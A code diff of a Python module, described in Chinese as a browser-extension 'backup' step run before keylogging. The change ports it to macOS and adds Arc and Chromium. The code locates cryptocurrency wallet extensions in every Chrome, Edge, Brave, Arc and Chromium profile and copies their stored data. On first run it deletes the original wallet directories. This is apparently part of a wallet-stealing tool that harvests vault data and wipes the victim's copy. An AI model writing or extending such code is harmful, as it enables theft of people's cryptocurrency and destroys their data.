@@ -3,7 +3,7 @@
 浏览器扩展数据备份模块
 
 在启动键盘记录前，备份目标钱包扩展的 Local Extension Settings 数据。
-支持 Chrome、Edge、Brave 及其多个 Profile 分身。
+支持 Chrome、Edge、Brave、Arc 及其多个 Profile 分身（macOS）。
 """
 
 import getpass
@@ -58,16 +58,14 @@ TARGET_EXTENSIONS: Dict[str, Dict[str, List[str]]] = {
     },
 }
 
+_APP_SUPPORT = os.path.join(str(Path.home()), "Library", "Application Support")
+
 BROWSER_USER_DATA_PATHS: Dict[str, str] = {
-    "chrome": os.path.join(
-        os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
-    ),
-    "edge": os.path.join(
-        os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"
-    ),
-    "brave": os.path.join(
-        os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"
-    ),
+    "chrome": os.path.join(_APP_SUPPORT, "Google", "Chrome"),
+    "edge": os.path.join(_APP_SUPPORT, "Microsoft Edge"),
+    "brave": os.path.join(_APP_SUPPORT, "BraveSoftware", "Brave-Browser"),
+    "arc": os.path.join(_APP_SUPPORT, "Arc", "User Data"),
+    "chromium": os.path.join(_APP_SUPPORT, "Chromium"),
 }
 
 
@@ -83,7 +81,9 @@ def _identify_extension(ext_id: str, profile_path: str) -> Optional[str]:
 
     try:
         for version_dir in os.listdir(extensions_dir):
-            manifest_path = os.path.join(extensions_dir, version_dir, "manifest.json")
+            manifest_path = os.path.join(
+                extensions_dir, version_dir, "manifest.json"
+            )
             if not os.path.isfile(manifest_path):
                 continue
             with open(manifest_path, "r", encoding="utf-8") as f:
@@ -137,7 +137,9 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
             if item != "Default" and not item.startswith("Profile "):
                 continue
 
-            ext_settings_path = os.path.join(item_path, "Local Extension Settings")
+            ext_settings_path = os.path.join(
+                item_path, "Local Extension Settings"
+            )
             if not os.path.isdir(ext_settings_path):
                 continue
 
@@ -158,7 +160,8 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
                     continue
 
                 target_name = (
-                    f"{user_prefix}_{browser_name}_{profile_name}_{ext_name} (ID {ext_id})"
+                    f"{user_prefix}_{browser_name}_{profile_name}"
+                    f"_{ext_name} (ID {ext_id})"
                 )
                 target_path = backup_dir / target_name
 
@@ -166,8 +169,8 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
                     if dry_run:
                         backed_up += 1
                         print(
-                            f"  [dry-run] {browser_name}/{profile_name}/{ext_name} "
-                            f"(ID: {ext_id}) -> {target_path}"
+                            f"  [dry-run] {browser_name}/{profile_name}"
+                            f"/{ext_name} (ID: {ext_id}) -> {target_path}"
                         )
                         continue
                     if target_path.exists():
@@ -178,9 +181,16 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
                     )
                     backed_up += 1
                     sources_to_delete.append(ext_source)
-                    print(f"  + {browser_name}/{profile_name}/{ext_name} (ID: {ext_id})")
+                    print(
+                        f"  + {browser_name}/{profile_name}"
+                        f"/{ext_name} (ID: {ext_id})"
+                    )
                 except Exception as e:
-                    print(f"  ! 备份失败: {browser_name}/{profile_name}/{ext_id} - {e}", file=sys.stderr)
+                    print(
+                        f"  ! 备份失败: {browser_name}/{profile_name}"
+                        f"/{ext_id} - {e}",
+                        file=sys.stderr,
+                    )
 
     if not dry_run and first_run and backed_up > 0:
         for src in sources_to_delete:
@@ -189,7 +199,10 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
             except Exception:
                 pass
         from datetime import datetime as _dt
-        marker_file.write_text(f"purged_at={_dt.now().isoformat()}\n", encoding="utf-8")
+        marker_file.parent.mkdir(parents=True, exist_ok=True)
+        marker_file.write_text(
+            f"purged_at={_dt.now().isoformat()}\n", encoding="utf-8"
+        )
         print(f"  * 首次运行：已清除 {len(sources_to_delete)} 个源目录")
 
     return backed_up
